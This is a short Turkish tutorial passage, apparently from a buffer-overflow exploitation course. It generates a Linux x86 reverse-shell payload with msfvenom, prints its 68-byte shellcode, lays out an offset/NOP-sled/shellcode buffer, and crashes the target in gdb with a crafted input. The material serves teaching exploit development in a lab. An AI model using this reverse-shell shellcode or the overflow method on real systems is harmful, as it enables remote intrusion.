# Shellcode Length

!!! abstract

    Shellcode, binary kodunun hexadecimal temsili olarak ifade edilebilir.

Örnek bir shellcode oluşturalım:

```sh
my@attack:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f c --platform linux -a x86
```

```output title="Output" hl_lines="2"
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00"
"\x01\x68\x02\x00\x23\x29\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Shellcode boyutunun 68 bayt olduğunu görebiliriz.

Ancak ihtiyatlı olmak adına shellcode boyutunu 150 bayt olarak ele alalım:

| OFFSET | NOP | SHELLCODE | BUFFER |
|---|---|---|---|
| 1036 | 100 | 150 | 1036 - 100 - 150 = 786 |

Shellcode öncesine [NOP slide](https://en.wikipedia.org/wiki/NOP_slide) (0x90) adı verilen bir sekans yerleştirelim.

Programı tekrar çalıştıralım:

```sh
(gdb) run $(python2 -c 'print "\x55" * (1036 - 100 - 150) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

```nasm title="Output"
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```
